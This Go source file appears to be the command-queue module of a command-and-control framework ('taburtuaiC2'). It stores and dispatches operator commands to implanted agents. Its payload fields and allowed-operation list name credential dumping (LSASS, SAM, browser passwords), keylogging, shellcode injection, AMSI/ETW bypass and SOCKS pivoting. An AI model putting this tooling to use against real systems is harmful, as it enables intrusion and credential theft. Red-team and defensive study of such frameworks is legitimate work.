package core

import (
	"encoding/json"
	"fmt"
	"sync"
	"time"

	"github.com/mjopsec/taburtuaiC2/internal/storage"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// CommandQueue persists and dispatches commands via SQLite
type CommandQueue struct {
	store *storage.Store
	mu    sync.Mutex // serialises GetNext to prevent double-dispatch
}

// NewCommandQueue creates a queue backed by store
func NewCommandQueue(store *storage.Store) *CommandQueue {
	return &CommandQueue{store: store}
}

// Add validates and persists a command as 'pending'
func (cq *CommandQueue) Add(agentID string, cmd *types.Command) error {
	if cmd == nil {
		return fmt.Errorf("command cannot be nil")
	}
	if agentID == "" {
		return fmt.Errorf("agent ID cannot be empty")
	}
	if cmd.ID == "" {
		return fmt.Errorf("command ID cannot be empty")
	}
	if err := validateCommandForQueue(cmd); err != nil {
		return fmt.Errorf("command validation failed: %v", err)
	}

	const maxQueueSize = 1000
	size, err := cq.store.GetAgentQueueSize(agentID)
	if err != nil {
		return fmt.Errorf("queue size check: %w", err)
	}
	if size >= maxQueueSize {
		return fmt.Errorf("command queue full for agent %s (max %d commands)", agentID, maxQueueSize)
	}

	row, err := cmdToRow(cmd)
	if err != nil {
		return fmt.Errorf("encode command: %w", err)
	}
	return cq.store.InsertCommand(row)
}

// GetNext returns the next command the agent should execute.
// If a command is already executing it is returned (unless it timed out).
// If timed out the command is marked and the next pending command is dispatched.
func (cq *CommandQueue) GetNext(agentID string) *types.Command {
	if agentID == "" {
		return nil
	}
	cq.mu.Lock()
	defer cq.mu.Unlock()

	// Check for active command
	active, hasActive, err := cq.store.GetAgentExecutingCommand(agentID)
	if err == nil && hasActive {
		cmd := rowToCmd(active)
		if cmd.Timeout > 0 && time.Since(cmd.ExecutedAt) > time.Duration(cmd.Timeout)*time.Second {
			// Timeout — mark it and fall through to next pending
			active.Status = "timeout"
			active.CompletedAt = time.Now().Unix()
			active.Error = fmt.Sprintf("Command execution timeout after %d seconds", cmd.Timeout)
			_ = cq.store.UpdateCommandStatus(active)
		} else {
			return cmd
		}
	}

	// Dispatch next pending
	pending, hasPending, err := cq.store.GetAgentNextPending(agentID)
	if err != nil || !hasPending {
		return nil
	}
	pending.Status = "executing"
	pending.ExecutedAt = time.Now().Unix()
	if err := cq.store.UpdateCommandStatus(pending); err != nil {
		return nil
	}
	return rowToCmd(pending)
}

// CompleteCommand records the result of a finished command
func (cq *CommandQueue) CompleteCommand(commandID string, result *types.CommandResult) (*types.Command, error) {
	if commandID == "" {
		return nil, fmt.Errorf("command ID cannot be empty")
	}
	if result == nil {
		return nil, fmt.Errorf("command result cannot be nil")
	}

	row, found, err := cq.store.GetCommand(commandID)
	if err != nil {
		return nil, err
	}
	if !found {
		return nil, fmt.Errorf("command not found: %s", commandID)
	}
	// Already completed — return as-is
	if row.Status != "executing" && row.Status != "pending" {
		return rowToCmd(row), nil
	}

	row.CompletedAt = time.Now().Unix()
	row.ExitCode = result.ExitCode

	if len(result.Output) > 1000000 {
		row.Output = result.Output[:1000000] + "\n[Output truncated - too large]"
	} else {
		row.Output = result.Output
	}
	if len(result.Error) > 10000 {
		row.Error = result.Error[:10000] + "\n[Error message truncated - too large]"
	} else {
		row.Error = result.Error
	}

	// Use exit code as the authoritative success indicator.
	// Stderr may contain non-fatal warnings (e.g. PowerShell CLIXML progress
	// records) even on a successful run, so we do not treat non-empty Error
	// alone as a failure.
	if result.ExitCode == 0 {
		row.Status = "completed"
	} else {
		row.Status = "failed"
	}

	if err := cq.store.UpdateCommandStatus(row); err != nil {
		return nil, err
	}
	return rowToCmd(row), nil
}

// GetCommand returns a command by ID regardless of status
func (cq *CommandQueue) GetCommand(commandID string) *types.Command {
	if commandID == "" {
		return nil
	}
	row, found, err := cq.store.GetCommand(commandID)
	if err != nil || !found {
		return nil
	}
	return rowToCmd(row)
}

// GetAgentCommands returns commands for an agent with optional status filter
func (cq *CommandQueue) GetAgentCommands(agentID string, status string, limit int) []*types.Command {
	if agentID == "" {
		return []*types.Command{}
	}
	if limit <= 0 || limit > 1000 {
		limit = 50
	}
	rows, err := cq.store.GetAgentCommands(agentID, status, limit)
	if err != nil {
		return []*types.Command{}
	}
	cmds := make([]*types.Command, 0, len(rows))
	for _, r := range rows {
		cmds = append(cmds, rowToCmd(r))
	}
	return cmds
}

// ClearQueue cancels all pending commands for an agent and returns how many were cleared
func (cq *CommandQueue) ClearQueue(agentID string) int {
	if agentID == "" {
		return 0
	}
	n, _ := cq.store.CancelAgentPendingCommands(agentID)
	return n
}

// GetStats returns aggregate command queue statistics
func (cq *CommandQueue) GetStats() map[string]any {
	stats, err := cq.store.GetCommandStats()
	if err != nil {
		return map[string]any{"error": err.Error()}
	}
	return stats
}

// CleanOldResults removes completed commands older than maxAge
func (cq *CommandQueue) CleanOldResults(maxAge time.Duration) int {
	if maxAge <= 0 {
		return 0
	}
	n, _ := cq.store.CleanOldCommands(maxAge)
	return n
}

// GetQueueSize returns the pending command count for an agent
func (cq *CommandQueue) GetQueueSize(agentID string) int {
	if agentID == "" {
		return 0
	}
	n, _ := cq.store.GetAgentQueueSize(agentID)
	return n
}

// HasActiveCommand reports whether an agent has an executing command
func (cq *CommandQueue) HasActiveCommand(agentID string) bool {
	if agentID == "" {
		return false
	}
	_, has, _ := cq.store.GetAgentExecutingCommand(agentID)
	return has
}

// GetActiveCommand returns the executing command for an agent, or nil
func (cq *CommandQueue) GetActiveCommand(agentID string) *types.Command {
	if agentID == "" {
		return nil
	}
	row, has, err := cq.store.GetAgentExecutingCommand(agentID)
	if err != nil || !has {
		return nil
	}
	return rowToCmd(row)
}

// CancelCommand cancels a pending or executing command by ID
func (cq *CommandQueue) CancelCommand(commandID string) error {
	if commandID == "" {
		return fmt.Errorf("command ID cannot be empty")
	}
	row, found, err := cq.store.GetCommand(commandID)
	if err != nil {
		return err
	}
	if !found {
		return fmt.Errorf("command not found: %s", commandID)
	}
	if row.Status != "pending" && row.Status != "executing" {
		return fmt.Errorf("command already completed, cannot cancel")
	}
	row.Status = "cancelled"
	row.CompletedAt = time.Now().Unix()
	row.Error = "Command cancelled by user"
	return cq.store.UpdateCommandStatus(row)
}

// ── conversion helpers ────────────────────────────────────────────────────────

// cmdPayload holds all Phase 2+ fields that don't have dedicated DB columns.
// It is stored as JSON in the payload_json column so nothing is lost on round-trip.
type cmdPayload struct {
	// Phase 2
	ShellcodeB64    string `json:"shellcode_b64,omitempty"`
	InjectMethod    string `json:"inject_method,omitempty"`
	InjectPID       uint32 `json:"inject_pid,omitempty"`
	SpoofParentPID  uint32 `json:"spoof_parent_pid,omitempty"`
	SpoofParentName string `json:"spoof_parent_name,omitempty"`
	TimestompRef    string `json:"timestomp_ref,omitempty"`
	TimestompTime   string `json:"timestomp_time,omitempty"`
	FetchURL        string `json:"fetch_url,omitempty"`
	FetchMethod     string `json:"fetch_method,omitempty"`
	// Phase 3
	BypassTargetPID uint32 `json:"bypass_target_pid,omitempty"`
	TokenPID        uint32 `json:"token_pid,omitempty"`
	TokenUser       string `json:"token_user,omitempty"`
	TokenDomain     string `json:"token_domain,omitempty"`
	TokenPass       string `json:"token_pass,omitempty"`
	TokenExe        string `json:"token_exe,omitempty"`
	TokenArgs       string `json:"token_args,omitempty"`
	KeylogDuration  int    `json:"keylog_duration,omitempty"`
	// Phase 4
	SacrificialDLL string `json:"sacrificial_dll,omitempty"`
	// Phase 5
	BrowserType string `json:"browser_type,omitempty"`
	// Phase 6
	SleepDuration int `json:"sleep_duration,omitempty"`
	// Phase 8
	HWBPAddr     string `json:"hwbp_addr,omitempty"`
	HWBPRegister uint8  `json:"hwbp_register,omitempty"`
	// Phase 9
	BOFData string `json:"bof_data,omitempty"`
	BOFArgs string `json:"bof_args,omitempty"`
	// Phase 10
	WorkingHoursStart int    `json:"working_hours_start,omitempty"`
	WorkingHoursEnd   int    `json:"working_hours_end,omitempty"`
	KillDate          string `json:"kill_date,omitempty"`
	// Phase 11 — Network recon
	ScanTargets     []string `json:"scan_targets,omitempty"`
	ScanPorts       []int    `json:"scan_ports,omitempty"`
	ScanTimeout     int      `json:"scan_timeout,omitempty"`
	ScanWorkers     int      `json:"scan_workers,omitempty"`
	ScanGrabBanners bool     `json:"scan_grab_banners,omitempty"`
	// Phase 11 — Registry
	RegHive  string `json:"reg_hive,omitempty"`
	RegKey   string `json:"reg_key,omitempty"`
	RegValue string `json:"reg_value,omitempty"`
	RegData  string `json:"reg_data,omitempty"`
	RegType  string `json:"reg_type,omitempty"`
	// Phase 11 — SOCKS5
	Socks5Addr string `json:"socks5_addr,omitempty"`
}

func cmdToRow(cmd *types.Command) (storage.CommandRow, error) {
	argsJSON, err := json.Marshal(cmd.Args)
	if err != nil {
		return storage.CommandRow{}, err
	}
	metaJSON, err := json.Marshal(cmd.Metadata)
	if err != nil {
		return storage.CommandRow{}, err
	}
	procArgsJSON, err := json.Marshal(cmd.ProcessArgs)
	if err != nil {
		return storage.CommandRow{}, err
	}

	var execAt, compAt int64
	if !cmd.ExecutedAt.IsZero() {
		execAt = cmd.ExecutedAt.Unix()
	}
	if !cmd.CompletedAt.IsZero() {
		compAt = cmd.CompletedAt.Unix()
	}

	payload := cmdPayload{
		ShellcodeB64:      cmd.ShellcodeB64,
		InjectMethod:      cmd.InjectMethod,
		InjectPID:         cmd.InjectPID,
		SpoofParentPID:    cmd.SpoofParentPID,
		SpoofParentName:   cmd.SpoofParentName,
		TimestompRef:      cmd.TimestompRef,
		TimestompTime:     cmd.TimestompTime,
		FetchURL:          cmd.FetchURL,
		FetchMethod:       cmd.FetchMethod,
		BypassTargetPID:   cmd.BypassTargetPID,
		TokenPID:          cmd.TokenPID,
		TokenUser:         cmd.TokenUser,
		TokenDomain:       cmd.TokenDomain,
		TokenPass:         cmd.TokenPass,
		TokenExe:          cmd.TokenExe,
		TokenArgs:         cmd.TokenArgs,
		KeylogDuration:    cmd.KeylogDuration,
		SacrificialDLL:    cmd.SacrificialDLL,
		BrowserType:       cmd.BrowserType,
		SleepDuration:     cmd.SleepDuration,
		HWBPAddr:          cmd.HWBPAddr,
		HWBPRegister:      cmd.HWBPRegister,
		BOFData:           cmd.BOFData,
		BOFArgs:           cmd.BOFArgs,
		WorkingHoursStart: cmd.WorkingHoursStart,
		WorkingHoursEnd:   cmd.WorkingHoursEnd,
		KillDate:          cmd.KillDate,
		// Phase 11
		ScanTargets:     cmd.ScanTargets,
		ScanPorts:       cmd.ScanPorts,
		ScanTimeout:     cmd.ScanTimeout,
		ScanWorkers:     cmd.ScanWorkers,
		ScanGrabBanners: cmd.ScanGrabBanners,
		RegHive:         cmd.RegHive,
		RegKey:          cmd.RegKey,
		RegValue:        cmd.RegValue,
		RegData:         cmd.RegData,
		RegType:         cmd.RegType,
		Socks5Addr:      cmd.Socks5Addr,
	}
	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		return storage.CommandRow{}, err
	}

	return storage.CommandRow{
		ID:              cmd.ID,
		AgentID:         cmd.AgentID,
		Command:         cmd.Command,
		ArgsJSON:        string(argsJSON),
		WorkingDir:      cmd.WorkingDir,
		Timeout:         cmd.Timeout,
		Status:          cmd.Status,
		ExitCode:        cmd.ExitCode,
		Output:          cmd.Output,
		Error:           cmd.Error,
		MetadataJSON:    string(metaJSON),
		OperationType:   cmd.OperationType,
		SourcePath:      cmd.SourcePath,
		DestinationPath: cmd.DestinationPath,
		FileContent:     cmd.FileContent,
		IsEncrypted:     cmd.IsEncrypted,
		ProcessName:     cmd.ProcessName,
		ProcessID:       cmd.ProcessID,
		ProcessPath:     cmd.ProcessPath,
		ProcessArgsJSON: string(procArgsJSON),
		PersistMethod:   cmd.PersistMethod,
		PersistName:     cmd.PersistName,
		CreatedAt:       cmd.CreatedAt.Unix(),
		ExecutedAt:      execAt,
		CompletedAt:     compAt,
		PayloadJSON:     string(payloadBytes),
	}, nil
}

func rowToCmd(r storage.CommandRow) *types.Command {
	cmd := &types.Command{
		ID:              r.ID,
		AgentID:         r.AgentID,
		Command:         r.Command,
		WorkingDir:      r.WorkingDir,
		Timeout:         r.Timeout,
		Status:          r.Status,
		ExitCode:        r.ExitCode,
		Output:          r.Output,
		Error:           r.Error,
		OperationType:   r.OperationType,
		SourcePath:      r.SourcePath,
		DestinationPath: r.DestinationPath,
		FileContent:     r.FileContent,
		IsEncrypted:     r.IsEncrypted,
		ProcessName:     r.ProcessName,
		ProcessID:       r.ProcessID,
		ProcessPath:     r.ProcessPath,
		PersistMethod:   r.PersistMethod,
		PersistName:     r.PersistName,
		CreatedAt:       time.Unix(r.CreatedAt, 0),
	}
	if r.ExecutedAt > 0 {
		cmd.ExecutedAt = time.Unix(r.ExecutedAt, 0)
	}
	if r.CompletedAt > 0 {
		cmd.CompletedAt = time.Unix(r.CompletedAt, 0)
	}

	_ = json.Unmarshal([]byte(r.ArgsJSON), &cmd.Args)
	_ = json.Unmarshal([]byte(r.MetadataJSON), &cmd.Metadata)
	_ = json.Unmarshal([]byte(r.ProcessArgsJSON), &cmd.ProcessArgs)

	if r.PayloadJSON != "" && r.PayloadJSON != "{}" {
		var p cmdPayload
		if err := json.Unmarshal([]byte(r.PayloadJSON), &p); err == nil {
			cmd.ShellcodeB64 = p.ShellcodeB64
			cmd.InjectMethod = p.InjectMethod
			cmd.InjectPID = p.InjectPID
			cmd.SpoofParentPID = p.SpoofParentPID
			cmd.SpoofParentName = p.SpoofParentName
			cmd.TimestompRef = p.TimestompRef
			cmd.TimestompTime = p.TimestompTime
			cmd.FetchURL = p.FetchURL
			cmd.FetchMethod = p.FetchMethod
			cmd.BypassTargetPID = p.BypassTargetPID
			cmd.TokenPID = p.TokenPID
			cmd.TokenUser = p.TokenUser
			cmd.TokenDomain = p.TokenDomain
			cmd.TokenPass = p.TokenPass
			cmd.TokenExe = p.TokenExe
			cmd.TokenArgs = p.TokenArgs
			cmd.KeylogDuration = p.KeylogDuration
			cmd.SacrificialDLL = p.SacrificialDLL
			cmd.BrowserType = p.BrowserType
			cmd.SleepDuration = p.SleepDuration
			cmd.HWBPAddr = p.HWBPAddr
			cmd.HWBPRegister = p.HWBPRegister
			cmd.BOFData = p.BOFData
			cmd.BOFArgs = p.BOFArgs
			cmd.WorkingHoursStart = p.WorkingHoursStart
			cmd.WorkingHoursEnd = p.WorkingHoursEnd
			cmd.KillDate = p.KillDate
			// Phase 11
			cmd.ScanTargets = p.ScanTargets
			cmd.ScanPorts = p.ScanPorts
			cmd.ScanTimeout = p.ScanTimeout
			cmd.ScanWorkers = p.ScanWorkers
			cmd.ScanGrabBanners = p.ScanGrabBanners
			cmd.RegHive = p.RegHive
			cmd.RegKey = p.RegKey
			cmd.RegValue = p.RegValue
			cmd.RegData = p.RegData
			cmd.RegType = p.RegType
			cmd.Socks5Addr = p.Socks5Addr
		}
	}
	return cmd
}

// ── validation (unchanged) ────────────────────────────────────────────────────

func validateCommandForQueue(cmd *types.Command) error {
	// execute / basic shell commands require a non-empty command text
	if (cmd.OperationType == "" || cmd.OperationType == "execute") && cmd.Command == "" {
		return fmt.Errorf("command text cannot be empty for execute operations")
	}
	if len(cmd.Command) > 10000 {
		return fmt.Errorf("command too long (max 10000 characters)")
	}
	if cmd.Timeout < 0 || cmd.Timeout > 3600 {
		return fmt.Errorf("invalid timeout value (must be 0-3600 seconds)")
	}
	if cmd.AgentID == "" {
		return fmt.Errorf("agent ID cannot be empty")
	}
	validOps := map[string]bool{
		// core
		"": true, "execute": true, "upload": true, "download": true,
		"process_list": true, "process_kill": true, "process_start": true,
		"persist_setup": true, "persist_remove": true,
		// phase 2 — injection / lolbins
		"inject_remote": true, "inject_self": true,
		"timestomp": true, "lolbin_fetch": true, "ads_exec": true,
		// phase 3 — bypass / token / recon
		"amsi_bypass": true, "etw_bypass": true,
		"token_list": true, "token_steal": true, "token_impersonate": true,
		"token_make": true, "token_revert": true, "token_runas": true,
		"screenshot": true,
		"keylog_start": true, "keylog_dump": true, "keylog_stop": true, "keylog_clear": true,
		// phase 4 — advanced injection
		"hollow": true, "hijack": true, "stomp": true, "mapinject": true,
		// phase 5 — credential access
		"lsass_dump": true, "sam_dump": true, "browsercreds": true, "clipboard_read": true,
		// phase 6-8 — evasion
		"sleep_obf": true, "unhook_ntdll": true, "hwbp_set": true, "hwbp_clear": true,
		// phase 9 — BOF
		"bof_exec": true,
		// phase 10 — OPSEC
		"antidebug": true, "antivm": true, "timegate_set": true,
		// phase 11 — network recon / registry / SOCKS5 pivot
		"net_scan": true, "arp_scan": true,
		"reg_read": true, "reg_write": true, "reg_delete": true, "reg_list": true,
		"socks5_start": true, "socks5_stop": true, "socks5_status": true,
		// extended techniques
		"lsass_dump_dup": true, "lsass_dump_wer": true,
		"amsi_hwbp": true, "etw_hwbp": true,
		"threadless_inject": true, "pe_load": true,
		"dotnet_exec": true, "ps_runspace": true, "stego_extract": true,
	}
	if !validOps[cmd.OperationType] {
		return fmt.Errorf("invalid operation type: %s", cmd.OperationType)
	}
	if cmd.OperationType == "upload" && cmd.DestinationPath == "" {
		return fmt.Errorf("destination path required for upload operation")
	}
	if cmd.OperationType == "download" && cmd.SourcePath == "" {
		return fmt.Errorf("source path required for download operation")
	}
	if cmd.OperationType == "upload" && len(cmd.FileContent) > 100*1024*1024 {
		return fmt.Errorf("file content too large (max 100MB)")
	}
	return nil
}
